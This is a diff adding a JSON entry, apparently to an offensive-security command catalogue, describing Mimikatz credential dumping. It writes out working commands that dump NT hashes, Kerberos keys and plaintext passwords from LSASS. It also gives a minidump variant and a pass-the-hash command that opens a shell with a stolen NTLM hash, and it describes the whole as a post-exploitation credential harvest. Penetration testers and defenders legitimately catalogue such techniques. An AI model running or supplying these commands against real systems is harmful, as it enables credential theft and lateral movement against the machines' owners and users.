@@ -1,0 +1,17 @@
+{
+  "id": "mimikatz-sekurlsa",
+  "name": "Mimikatz sekurlsa::logonpasswords",
+  "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+  "description": "Dump credentials (NT hashes, Kerberos keys, plaintext where wdigest is enabled, MSV1_0) from LSASS for every active logon session. The classic post-exploit credential harvest. Requires SeDebugPrivilege.",
+  "platform": "windows",
+  "requires": ["local-admin"],
+  "protocols": [],
+  "tags": ["mimikatz", "sekurlsa", "lsass", "credential-dump"],
+  "variations": [
+    { "label": "From LSASS Minidump", "requires": "local-admin", "command": "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" exit" },
+    { "label": "Pass-the-Hash", "requires": "local-admin", "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt-hash> /run:cmd.exe\" exit" }
+  ],
+  "examples": [
+    "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
+  ]
+}
